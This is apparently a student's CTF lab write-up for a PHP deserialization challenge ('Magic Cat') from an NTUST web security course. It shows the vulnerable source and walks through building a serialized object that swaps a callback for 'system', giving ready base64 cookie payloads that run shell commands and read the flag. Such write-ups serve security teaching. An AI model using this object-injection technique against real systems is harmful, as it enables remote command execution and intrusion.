<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Simple Web 0x18(Lab - Magic Cat)
  #


  tags: NTUSTWS CTF Web
  #

Challenge: http://h4ck3r.quest:8602/

  Background
  #

None&mldr;

  Source code
  #

:::spoiler code
isset($_GET['source']) && die(!show_source(__FILE__));

class Magic
{
    function cast($spell)
    {
        echo &#34;<script>alert('MAGIC, $spell!');</script>&#34;;
    }
}

// Useless class?
class Caster
{
    public $cast_func = 'intval';
    function cast($val)
    {
        return ($this->cast_func)($val);
    }
}


class Cat
{
    public $magic;
    public $spell;
    function __construct($spell)
    {
        $this->magic = new Magic();
        $this->spell = $spell;
    }
    function __wakeup()
    {
        echo &#34;Cat Wakeup!\n&#34;;
        $this->magic->cast($this->spell);
    }
}

if (isset($_GET['spell'])) {
    $cat = new Cat($_GET['spell']);
} else if (isset($_COOKIE['cat'])) {
    echo &#34;Unserialize...\n&#34;;
    $cat = unserialize(base64_decode($_COOKIE['cat']));
} else {
    $cat = new Cat(&#34;meow-meow-magic&#34;);
}
?>
<pre>
This is your üê±:
<?php var_dump($cat) ?>
</pre>

<p>Usage:</p>
<p>/?source</p>
<p>/?spell=the-spell-of-your-cat</p>
:::"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple Web 0x18(Lab - Magic Cat)"><meta property="og:description" content="Simple Web 0x18(Lab - Magic Cat) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8602/
Background # None‚Ä¶
Source code # :::spoiler code
isset($_GET['source']) && die(!show_source(__FILE__)); class Magic { function cast($spell) { echo &#34;<script>alert('MAGIC, $spell!');</script>&#34;; } } // Useless class? class Caster { public $cast_func = 'intval'; function cast($val) { return ($this->cast_func)($val); } } class Cat { public $magic; public $spell; function __construct($spell) { $this->magic = new Magic(); $this->spell = $spell; } function __wakeup() { echo &#34;Cat Wakeup!\n&#34;; $this->magic->cast($this->spell); } } if (isset($_GET['spell'])) { $cat = new Cat($_GET['spell']); } else if (isset($_COOKIE['cat'])) { echo &#34;Unserialize...\n&#34;; $cat = unserialize(base64_decode($_COOKIE['cat'])); } else { $cat = new Cat(&#34;meow-meow-magic&#34;); } ?> <pre> This is your üê±: <?php var_dump($cat) ?> </pre> <p>Usage:</p> <p>/?source</p> <p>/?spell=the-spell-of-your-cat</p> :::"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="NTUSTWS"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Web"><title>Simple Web 0x18(Lab - Magic Cat) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple Web 0x18(Lab - Magic Cat)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a><ul><li><a href=#description--analyze>Description & Analyze</a></li></ul></li><li><a href=#exploit---unserialize>Exploit - unserialize</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-web-0x18lab---magic-cat>Simple Web 0x18(Lab - Magic Cat)
<a class=anchor href=#simple-web-0x18lab---magic-cat>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><p>Challenge: <a href=http://h4ck3r.quest:8602/>http://h4ck3r.quest:8602/</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>None&mldr;</p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler code</p><pre tabindex=0><code class="language-php=<?php" data-lang="php=<?php">isset($_GET[&#39;source&#39;]) &amp;&amp; die(!show_source(__FILE__));

class Magic
{
    function cast($spell)
    {
        echo &#34;&lt;script&gt;alert(&#39;MAGIC, $spell!&#39;);&lt;/script&gt;&#34;;
    }
}

// Useless class?
class Caster
{
    public $cast_func = &#39;intval&#39;;
    function cast($val)
    {
        return ($this-&gt;cast_func)($val);
    }
}


class Cat
{
    public $magic;
    public $spell;
    function __construct($spell)
    {
        $this-&gt;magic = new Magic();
        $this-&gt;spell = $spell;
    }
    function __wakeup()
    {
        echo &#34;Cat Wakeup!\n&#34;;
        $this-&gt;magic-&gt;cast($this-&gt;spell);
    }
}

if (isset($_GET[&#39;spell&#39;])) {
    $cat = new Cat($_GET[&#39;spell&#39;]);
} else if (isset($_COOKIE[&#39;cat&#39;])) {
    echo &#34;Unserialize...\n&#34;;
    $cat = unserialize(base64_decode($_COOKIE[&#39;cat&#39;]));
} else {
    $cat = new Cat(&#34;meow-meow-magic&#34;);
}
?&gt;
&lt;pre&gt;
This is your üê±:
&lt;?php var_dump($cat) ?&gt;
&lt;/pre&gt;

&lt;p&gt;Usage:&lt;/p&gt;
&lt;p&gt;/?source&lt;/p&gt;
&lt;p&gt;/?spell=the-spell-of-your-cat&lt;/p&gt;
</code></pre><p>:::</p><h3 id=description--analyze>Description & Analyze
<a class=anchor href=#description--analyze>#</a></h3><h2 id=exploit---unserialize>Exploit - unserialize
<a class=anchor href=#exploit---unserialize>#</a></h2><ol><li><p>Test payload in local side</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ ./psysh
&gt; class Caster
. {
.     public $cast_func = &#39;intval&#39;;
.     function cast($val)
.     {
.         return ($this-&gt;cast_func)($val);
.     }
. }
&gt; $test = new Caster
= Caster {#2772
    +cast_func: &#34;intval&#34;,
  }

&gt; $test-&gt;cast_func = &#39;system&#39;
= &#34;system&#34;
&gt; $test-&gt;cast(&#39;pwd&#39;)
= &#34;/home/sbk6401&#34;
</code></pre></li><li><p>Construct serialized session</p><pre tabindex=0><code class=language-bash! data-lang=bash!>&gt; class Cat
. {
.     public $magic;
.     public $spell;
.     function __construct($spell)
.     {
.         $this-&gt;spell = $spell;
.         $this-&gt;magic = new Caster();
.     }
.     function __wakeup()
.     {
.         echo &#34;Cat Wakeup!\n&#34;;
.         $this-&gt;magic-&gt;cast($this-&gt;spell);
.     }
. }
&gt; $cat = new Cat(&#34;ls -al /&#34;)
= Cat {#2771
    +magic: Caster {#2763
      +cast_func: &#34;intval&#34;,
    },
    +spell: &#34;ls -al /&#34;,
  }
&gt; $cat-&gt;magic-&gt;cast_func = &#34;system&#34;
= &#34;system&#34;
&gt; base64_encode(serialize($cat))
= &#34;TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjg6ImxzIC1hbCAvIjt9&#34;
</code></pre><p><img src=https://i.imgur.com/x5tCrhb.png alt></p></li><li><p>Get flag</p><pre tabindex=0><code class=language-bash! data-lang=bash!>&gt; $cat-&gt;spell = &#34;cat /flag*&#34;
= &#34;cat /flag*&#34;

&gt; base64_encode(serialize($cat))
= &#34;TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjEwOiJjYXQgL2ZsYWcqIjt9&#34;
</code></pre><p><img src=https://i.imgur.com/c5Kq7c4.png alt></p></li></ol><p>Flag: <code>FLAG{magic_cat_pwnpwn}</code></p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://ithelp.ithome.com.tw/articles/10114633>PHPÁâ©‰ª∂Â∞éÂêëÁöÑÁ¨¨‰∏ÄË™≤Ôºöclass </a><a href=https://ithelp.ithome.com.tw/articles/10277044>„ÄêÁ¨¨ÂçÅ‰πùÂ§© - PHPÂèçÂ∫èÂàóÂåñ(1)„Äë</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a><ul><li><a href=#description--analyze>Description & Analyze</a></li></ul></li><li><a href=#exploit---unserialize>Exploit - unserialize</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>